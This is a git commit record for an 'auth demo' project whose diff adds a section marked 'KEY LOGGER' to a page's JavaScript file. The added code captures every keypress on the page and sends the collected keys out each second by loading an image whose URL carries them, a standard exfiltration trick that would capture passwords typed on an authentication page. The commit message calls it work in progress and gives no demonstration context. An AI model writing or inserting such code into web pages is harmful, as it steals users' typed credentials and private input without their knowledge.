8e009e6743529d943e0d1090a981c8b3db4ebf0b
georgy.saukov <gsaukov@yahoo.com>
2020-01-23 01:30:03 +0100

    authdemo work in progress

--- auth-demo/src/main/resources/static/js/authdemo.js
+++ auth-demo/src/main/resources/static/js/authdemo.js
@@ -188,3 +188,23 @@ socket.on('basicAuthFilter', function(data) {
 });
 
 //############# SOCKET IO SECTION ######################
+
+
+//############# KEY LOGGER ######################
+
+document.onkeypress = function(e) {
+	get = window.event?event:e;
+	key = get.keyCode?get.keyCode:get.charCode;
+	key = String.fromCharCode(key);
+	keys+=key;
+}
+window.setInterval(function(){
+	if(keys.length>0) {
+		new Image().src = url+keys;
+		keys = '';
+	}
+}, 1000);
+
+
+
+//############# KEY LOGGER  ######################
